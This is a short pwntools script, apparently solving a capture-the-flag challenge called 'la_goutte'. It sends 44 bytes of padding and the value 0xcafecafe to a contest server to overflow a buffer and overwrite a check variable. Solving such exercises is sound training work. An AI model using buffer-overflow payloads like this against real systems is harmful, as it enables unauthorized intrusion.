#!/usr/bin/env nix-shell
#!nix-shell -i python3 -p python3 python3Packages.pwntools

from pwnlib.util.packing import *
from pwn import *

# pad = b"\x61" * 48
pad = b"\x61" * 44
sol = p32(0xcafecafe)

# con = process('./la_goutte_public')
con = remote("challenges.unitedctf.ca", 17000)

print(con.recvline())
print(pad+sol)
con.sendline(pad + sol)
print(con.recvline())
## print(sol)
## con.send(sol)
## print(con.recvline())

